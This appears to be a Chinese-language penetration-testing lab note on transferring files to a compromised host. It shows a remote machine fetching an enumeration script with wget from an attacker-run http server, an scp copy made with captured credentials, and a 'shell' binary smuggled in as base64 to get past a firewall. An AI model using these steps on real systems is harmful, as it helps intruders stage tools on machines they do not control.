# Transferring Files  傳輸檔

我們需要將檔案傳輸到遠端伺服器時，我們可以使用枚舉腳本或是漏洞，將數據傳到我們的攻擊主機
雖然像 Metasploit 搭配 Meterpreter shell 這樣的工具可以使用 upload 指令來上傳檔案，但我們仍需學習在只有一般反向 shell 的情況下傳輸檔案的方法。

## Using wget  使用 wget
透過在機器上運行python http 伺服器，使用 **wget** 或是 **curl** 在遠端主機上下檔案。

進入我們需要傳輸得文件的目錄，並在其中運行python http 伺服器
```
Coconut820@htb[/htb]$ cd /tmp
Coconut820@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

現在我們已經在計算機上設置了一個偵聽伺服器，我們可以在執行代碼的遠端主機上下載檔：
```
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```

## Using SCP  使用 SCP
傳輸檔的另一種方法是使用 scp，前提是我們已經在遠端主機上獲得了 **ssh** 用戶憑證。我們可以這樣做：
```
Coconut820@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```
>[!Note] 
請注意，我們在 scp 指令後面指定了本地的檔案名稱，而 : 後面則是指定要儲存到的遠端目錄位置。

## Using Base64  使用 Base64
在某些情況下，我們可能無法直接傳輸檔案。例如，遠端主機可能有防火牆保護，阻止我們從本機下載檔案。遇到這種情況，我們可以透過**將檔案轉成base64 編碼，然後將base64字串貼到遠端伺服器上進行解碼**

例如，如果我們想要傳送一個名為 shell 的二進位檔案，可以用以下方式將它編碼成 base64：
```
Coconut820@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

複製這個base64 字串並在遠端主機中使用 **base64 -d** 解碼他，並將輸出導入到一個檔案中：
```
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

## Validating File Transfers 驗證檔案傳輸
為了驗證檔案的格式，我們可以在該檔案上執行 file 指令：
```
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

如我們所見，當我們對 shell 檔案執行 file 指令時，它顯示該檔案是 ELF 二進位檔，這代表我們成功地完成了檔案傳輸。為了確保在編碼／解碼過程中檔案沒有被破壞，我們可以檢查它的 md5 雜湊值。

在我們本機上，我們可以對原始檔案執行以下指令來取得其 md5 值：
```
Coconut820@htb[/htb]$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

現在，我們可以轉到遠端伺服器，對我們傳輸的檔案運行相同的命令：
```
user@remotehost$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

正如我們所看到的，兩個檔具有相同的 md5 哈希值，這意味著檔已正確傳輸。還有其他多種傳輸檔的方法。
